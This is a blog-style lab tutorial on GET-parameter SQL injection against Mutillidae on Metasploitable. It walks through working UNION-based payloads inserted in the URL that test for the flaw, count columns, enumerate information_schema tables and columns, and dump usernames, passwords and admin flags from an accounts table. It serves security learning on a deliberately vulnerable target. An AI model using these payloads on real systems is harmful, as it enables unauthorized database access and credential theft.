+++
categories = ["Metasploitable", "SQL"]
date = "2021-02-14"
title = "SQL Get Injection"
type = ["posts","post"]
[ author ]
  name = "nazori"
+++

This can be used when the web is sending information about the user from the databases. If this is done with the GET method we will be able to see the information displayed on the URL. There is where we will modify it. 



We are working with Mutillidae on Metasploitable. There's a page in which if you fill up your user and password it answers you with your user info. The output isw something like this:

*Username* = nazori

*Password* = jeje

*Signature*= lol

The URL will be like this one: 

```
http://10.0.2.4/mutillidae/index.php?page=user-info.php&username=nazori&password=jeje&user-info-php-submit-button=View+Account+Details
```

## Checking vulnerability

First of all, let's ensure that the vulnerability exists. We will try to order by a number of column that is ridiculus `order by 1000#`. We insert this on the URL request, after the first input. `#` is replaced by `%23` in html.

```
http//...
&username=nazori'order by 1000%23&...
```

If we get an SQL related error after this, it is vulnerable.

## Reading the database information

Following the previous example, we are now to determine the number of columns existing on the current database. For this we just have to try and error until we no longer get an error. In this case it is 5.

Now we use the UNION function on the SQL request. The UNION operator is used to combine the result-set of two or more SELECT statements. Replace the `'order by 5 #` for `'union select 1,2,3,4,5`. 

```
http//...
&username=nazori'union select 1,2,3,4,5%23&...
```

* Output

*the previous output plus*
 

*Username* = 2

*Password* = 3

*Signature*= 4

Now we know that we can write on those columns (2,3,4). We are now replacing the number on the request by functions that can give us some info.

```
http//...
&username=nazori'union select 1,database(),user(),version(),5%23&...
```
* Output
  
*Username*=owasp10

*Password*=root@localhost

*Signature*=5.0.51a-3ubuntu5

## Finding database tables

To find the infromation about the rests of the tables we are going to look for `information_schema.tables`. The information schema is an ANSI-standard set of read-only views that provide information about all of the tables, views, columns, and procedures in a database. 

```
http//...
&username=nazori'union select 1,table_name,null,null,5 from information_schema.tables%23&...
```
We would get an enormous amount of table names. We may not be interested in this, so we can filter it with `WHERE table_schema = 'owasp10'` which is the name of the current web app.

The output are 7 different table names.


## Data extraction

We are going to focus on the table named `accounts`. Request the column names to see whats inside the table.

```
http//...
&username=nazori'union select 1,column_name,null,null,5 from information_schema.columns where table_name = 'accounts'%23&...
```
* Output
  
 `cid username password mysignature is_admin` 

Now that we know the names of the columns we can ask for specific info inside the columns.

```
http//...
&username=nazori'union select 1,username,password,is_admin,5 from accounts%23&...
```

